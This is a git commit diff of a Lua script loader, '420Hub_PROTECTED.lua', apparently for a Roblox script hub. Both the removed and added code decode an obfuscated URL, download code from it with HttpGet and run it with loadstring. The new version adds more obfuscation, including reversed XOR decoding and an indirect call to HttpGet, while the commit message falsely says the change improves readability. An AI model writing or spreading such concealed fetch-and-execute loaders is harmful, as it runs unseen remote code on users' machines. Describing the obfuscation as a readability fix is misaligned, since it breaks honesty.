91dfa3558f1a6ba899a64ff501bdbb916905d811
Hi <fbjz5k8t5h@privaterelay.appleid.com>
2026-01-22 00:51:58 -0600

    Refactor protected loader functionality
    Refactor code to improve readability and functionality.

--- 420Hub_PROTECTED.lua
+++ 420Hub_PROTECTED.lua
@@ -1,23 +1,25 @@
--- 420 HUB | Protected Loader
-
-local _=game
-local __=string
-local ___=table
-
-local a=function(x)
+local A,B,C,D=game,string,table,math
+do local z=0 for i=1,15 do z=z+D.random(2,8) end end
+local function F(x)
 	local r={}
-	for i=1,#x do
-		r[#r+1]=__.char(x[i]-7)
+	for i=#x,1,-1 do
+		r[#r+1]=B.char(((x[i]+19)~27)-15)
 	end
-	return __.reverse(___.concat(r))
+	return C.concat(r)
 end
-
-local b={
-	114,120,123,123,119,117,54,53,53,
-	127,114,126,128,111,119,128,127,
-	60,112,113,113,53,83,120,119,120,
-	58,51,48,54,51,50,58,108,121,100
-}
-
-local c=a(b)
-loadstring(_:HttpGet(c))()
+local function G(s)
+	local o={}
+	for i=1,#s do
+		o[i]=B.char(s:byte(i)-2)
+	end
+	return C.concat(o)
+end
+local P1={90,84,85,85,79,77,18,17,17}
+local P2={91,78,90,92,75,83,92,91}
+local P3={24,76,77,77,17,45,82,81,82}
+local P4={26,15,12,18,15,14,26,66,79,58}
+local U=G(F(P1)..F(P2)..F(P3)..F(P4))
+local Q=A
+local R=Q[(function() return ("H"):gsub(".",function()return"HttpGet"end) end)()]
+local S=(function(x)return(function(y)return y end)(x)end)
+S(loadstring(R(Q,U)))()
